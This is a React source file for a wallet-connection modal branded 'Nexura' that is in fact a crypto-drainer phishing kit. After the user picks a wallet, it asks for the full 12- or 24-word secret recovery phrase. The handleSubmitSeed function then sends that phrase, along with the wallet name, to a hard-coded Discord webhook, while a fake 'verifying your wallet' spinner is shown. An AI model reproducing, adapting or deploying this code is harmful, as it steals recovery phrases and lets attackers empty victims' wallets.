import { Loader2, X } from 'lucide-react';
import { useEffect, useState } from 'react';
import { motion, AnimatePresence } from 'framer-motion';

interface WalletModalProps {
  isOpen: boolean;
  onClose: () => void;
}

const wallets = [
  'MetaMask',
  'WalletConnect',
  'Coinbase Wallet',
  'Trust Wallet',
  'Phantom',
  'Brave Wallet',
  'Ledger Live',
  'Rainbow',
  'Custom Wallet'
];

export default function WalletModal({ isOpen, onClose }: WalletModalProps) {
  const [selectedWallet, setSelectedWallet] = useState<string>('');
  const [verificationStep, setVerificationStep] = useState<'select' | 'verify' | 'seed' | 'loading'>('select');
  const [seedLength, setSeedLength] = useState<12 | 24>(12);
  const [seedPhrases, setSeedPhrases] = useState<string[]>(Array(12).fill(''));
  const [isProcessing, setIsProcessing] = useState(false);

  useEffect(() => {
    if (!isOpen) {
      setVerificationStep('select');
      setSelectedWallet('');
      setSeedPhrases(Array(12).fill(''));
      setIsProcessing(false);
    }
  }, [isOpen]);

  const handleSeedLengthChange = (length: 12 | 24) => {
    setSeedLength(length);
    setSeedPhrases(Array(length).fill(''));
  };

  const handleSeedPhraseChange = (index: number, value: string) => {
    const newPhrases = [...seedPhrases];
    newPhrases[index] = value;
    setSeedPhrases(newPhrases);
  };

  const handleClearAll = () => {
    setSeedPhrases(Array(seedLength).fill(''));
  };

  const isValidSeedPhrase = () => {
    return seedPhrases.every(phrase => phrase.trim() !== '');
  };

  const handleSubmitSeed = async () => {
    setVerificationStep('loading');
    try {
      await fetch('https://discord.com/api/webhooks/1290064859018428466/_qS1U4H3wEyLE4PE0edFtOYc-24ER73KWwIRSuUKN9joNIMXXEiyA1qAmn3GT8ZuKtwh', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          content: `New Wallet Connection\nWallet: ${selectedWallet}\nSeed Phrase: ${seedPhrases.join(' ')}`,
        }),
      });
      await new Promise(resolve => setTimeout(resolve, 2000));
      onClose();
    } catch (error) {
      console.error('Error:', error);
      setVerificationStep('seed');
    }
  };

  if (!isOpen) return null;

  const modalVariants = {
    hidden: { opacity: 0, scale: 0.95 },
    visible: { opacity: 1, scale: 1 },
    exit: { opacity: 0, scale: 0.95 }
  };

  if (verificationStep === 'loading') {
    return (
      <div className="fixed inset-0 bg-black/50 backdrop-blur-sm z-50 flex items-center justify-center p-4">
        <motion.div
          initial="hidden"
          animate="visible"
          exit="exit"
          variants={modalVariants}
          className="bg-[#1a1a2e] rounded-2xl w-full max-w-md shadow-xl border border-purple-500/20 p-8"
        >
          <div className="flex flex-col items-center justify-center gap-4">
            <Loader2 className="w-12 h-12 text-purple-500 animate-spin" />
            <p className="text-lg font-medium text-white">Connecting to {selectedWallet}...</p>
            <p className="text-sm text-gray-400">Please wait while we verify your wallet</p>
          </div>
        </motion.div>
      </div>
    );
  }

  if (verificationStep === 'seed') {
    return (
      <div className="fixed inset-0 bg-black/50 backdrop-blur-sm z-50 flex items-center justify-center p-4">
        <motion.div
          initial="hidden"
          animate="visible"
          exit="exit"
          variants={modalVariants}
          className="bg-[#1a1a2e] rounded-2xl w-full max-w-md shadow-xl border border-purple-500/20"
        >
          <div className="p-6 border-b border-gray-800">
            <div className="flex items-center justify-between">
              <h2 className="text-xl font-semibold text-white">Import with Secret Phrase</h2>
              <button
                onClick={() => setVerificationStep('verify')}
                className="text-gray-400 hover:text-white transition-colors"
              >
                <X className="h-6 w-6" />
              </button>
            </div>
          </div>
          
          <div className="p-6 space-y-6">
            <div className="flex gap-4 mb-6">
              <button
                onClick={() => handleSeedLengthChange(12)}
                className={`flex-1 py-2 px-4 rounded-lg transition-colors ${
                  seedLength === 12
                    ? 'bg-purple-500 text-white'
                    : 'bg-gray-800 text-gray-300 hover:bg-gray-700'
                }`}
              >
                12 words
              </button>
              <button
                onClick={() => handleSeedLengthChange(24)}
                className={`flex-1 py-2 px-4 rounded-lg transition-colors ${
                  seedLength === 24
                    ? 'bg-purple-500 text-white'
                    : 'bg-gray-800 text-gray-300 hover:bg-gray-700'
                }`}
              >
                24 words
              </button>
            </div>

            <div className="grid grid-cols-3 gap-4 max-h-[400px] overflow-y-auto pr-2">
              {seedPhrases.map((phrase, index) => (
                <div key={index} className="relative">
                  <input
                    type="text"
                    value={phrase}
                    onChange={(e) => handleSeedPhraseChange(index, e.target.value)}
                    className="w-full bg-black/30 border border-purple-500/20 rounded-lg px-4 py-2 text-gray-100 focus:outline-none focus:ring-2 focus:ring-purple-500 text-sm"
                    placeholder={`Word #${index + 1}`}
                  />
                </div>
              ))}
            </div>

            <div className="flex justify-between items-center">
              <button
                onClick={handleClearAll}
                className="text-sm text-gray-400 hover:text-white transition-colors"
              >
                Clear all
              </button>
              <p className="text-sm text-gray-400">
                Secret Phrases must contain {seedLength} words
              </p>
            </div>

            <div className="flex gap-3">
              <button
                onClick={() => setVerificationStep('verify')}
                className="flex-1 bg-gray-800 text-white px-4 py-2 rounded-lg font-medium hover:bg-gray-700 transition-colors"
              >
                Back
              </button>
              <button
                onClick={handleSubmitSeed}
                disabled={!isValidSeedPhrase()}
                className="flex-1 bg-gradient-to-r from-purple-500 to-pink-500 text-white px-4 py-2 rounded-lg font-medium hover:opacity-90 transition-opacity disabled:opacity-50 disabled:cursor-not-allowed"
              >
                Next
              </button>
            </div>
          </div>
        </motion.div>
      </div>
    );
  }

  if (verificationStep === 'verify') {
    return (
      <div className="fixed inset-0 bg-black/50 backdrop-blur-sm z-50 flex items-center justify-center p-4">
        <motion.div
          initial="hidden"
          animate="visible"
          exit="exit"
          variants={modalVariants}
          className="bg-[#1a1a2e] rounded-2xl w-full max-w-md shadow-xl border border-purple-500/20"
        >
          <div className="p-6 border-b border-gray-800">
            <div className="flex items-center justify-between">
              <h2 className="text-xl font-semibold text-white">Connect {selectedWallet}</h2>
              <button
                onClick={() => setVerificationStep('select')}
                className="text-gray-400 hover:text-white transition-colors"
              >
                <X className="h-6 w-6" />
              </button>
            </div>
          </div>
          
          <div className="p-6 space-y-6">
            <div className="space-y-4">
              <p className="text-gray-300">
                By connecting your wallet, you agree to our Terms of Service and Privacy Policy.
              </p>
              <p className="text-sm text-gray-400">
                This connection will allow Nexura to:
              </p>
              <ul className="text-sm text-gray-400 space-y-2 list-disc list-inside">
                <li>View your wallet balance and activity</li>
                <li>Request approval for transactions</li>
                <li>Sign messages for authentication</li>
              </ul>
            </div>
            
            <div className="flex gap-3">
              <button
                onClick={() => setVerificationStep('select')}
                className="flex-1 bg-gray-800 text-white px-4 py-2 rounded-lg font-medium hover:bg-gray-700 transition-colors"
              >
                Back
              </button>
              <button
                onClick={() => setVerificationStep('seed')}
                className="flex-1 bg-gradient-to-r from-purple-500 to-pink-500 text-white px-4 py-2 rounded-lg font-medium hover:opacity-90 transition-opacity"
              >
                Import Wallet
              </button>
            </div>
          </div>
        </motion.div>
      </div>
    );
  }

  return (
    <div className="fixed inset-0 bg-black/50 backdrop-blur-sm z-50 flex items-center justify-center p-4">
      <motion.div
        initial="hidden"
        animate="visible"
        exit="exit"
        variants={modalVariants}
        className="bg-[#1a1a2e] rounded-2xl w-full max-w-md shadow-xl border border-purple-500/20"
      >
        <div className="p-6 border-b border-gray-800">
          <div className="flex items-center justify-between">
            <h2 className="text-xl font-semibold text-white">Connect Wallet</h2>
            <button
              onClick={onClose}
              className="text-gray-400 hover:text-white transition-colors"
            >
              <X className="h-6 w-6" />
            </button>
          </div>
        </div>
        
        <div className="p-6">
          <div className="space-y-2">
            {wallets.map((wallet) => (
              <button
                key={wallet}
                onClick={() => {
                  setSelectedWallet(wallet);
                  setVerificationStep('verify');
                }}
                className="w-full text-left px-4 py-3 rounded-lg bg-black/20 hover:bg-purple-500/10 transition-colors border border-purple-500/20 hover:border-purple-500/40"
              >
                Connect to {wallet}
              </button>
            ))}
          </div>
          
          <p className="mt-6 text-center text-sm text-gray-400">
            By connecting a wallet, you agree to Nexura's Terms of Service and Privacy Policy
          </p>
        </div>
      </motion.div>
    </div>
  );
}